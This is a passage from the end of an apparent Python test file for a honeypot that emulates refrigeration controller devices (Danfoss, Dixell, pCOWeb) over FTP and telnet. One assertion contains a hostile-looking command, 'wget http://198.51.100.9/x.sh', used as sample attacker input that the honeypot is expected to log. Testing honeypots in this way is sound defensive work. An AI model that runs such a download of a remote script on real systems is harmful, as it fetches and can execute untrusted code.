        assert "STOR" in cmds and "wget http://198.51.100.9/x.sh" in cmds, cmds
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    workdir = tempfile.mkdtemp()
    test_danfoss(workdir)
    test_danfoss_index_file(workdir)
    test_dixell(workdir)
    test_unit_strings(workdir)
    test_pcoweb(workdir)
    test_pcoweb_ftp_telnet(workdir)
    print("OK: all personas")
